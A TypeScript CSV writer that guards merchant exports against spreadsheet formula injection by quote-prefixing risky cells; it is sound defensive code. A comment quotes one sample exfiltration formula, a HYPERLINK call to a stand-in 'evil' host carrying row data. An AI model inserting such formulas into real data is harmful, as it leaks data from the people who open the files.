/**
 * Minimal RFC 4180 CSV writer with spreadsheet-injection protection.
 *
 * No dependency: this is ~40 lines and the escaping rules are the part that has to be
 * right, not the API surface.
 */

/**
 * Excel, LibreOffice and Google Sheets all treat a cell beginning with one of these as
 * a formula, not text.
 *
 * This is the most likely security bug in the export feature, and it is not
 * theoretical: `full_name` and `vehicle_number` are free text submitted by **anonymous**
 * members of the public through the QR form, and the file they land in is opened on the
 * merchant's own machine. A customer who types `=HYPERLINK("http://evil/"&A1,"Click")`
 * as their name gets that formula executed in the merchant's spreadsheet, with the row
 * data as an argument. `@` and `\t`/`\r` are included because they are the documented
 * lead-ins for DDE-style payloads.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  let text = value instanceof Date ? value.toISOString() : String(value);

  // Prefix with a single quote, which every major spreadsheet reads as "this is text".
  // Deliberately NOT stripping the character: the merchant should still see exactly
  // what the customer typed — a name legitimately beginning with `-` must survive.
  if (FORMULA_LEAD.test(text)) text = `'${text}`;

  // Quote if the value contains a delimiter, a quote, or a newline; double any quotes.
  if (/[",\r\n]/.test(text)) text = `"${text.replaceAll('"', '""')}"`;

  return text;
}

export function csvRow(values: unknown[]): string {
  return `${values.map(escapeCell).join(",")}\r\n`;
}

/**
 * UTF-8 byte-order mark.
 *
 * Excel on Windows opens a BOM-less CSV in the system codepage, which mangles every
 * accented name and can render `+27…` unpredictably. Three bytes that make the
 * difference between a usable export and a support ticket.
 */
export const UTF8_BOM = "﻿";
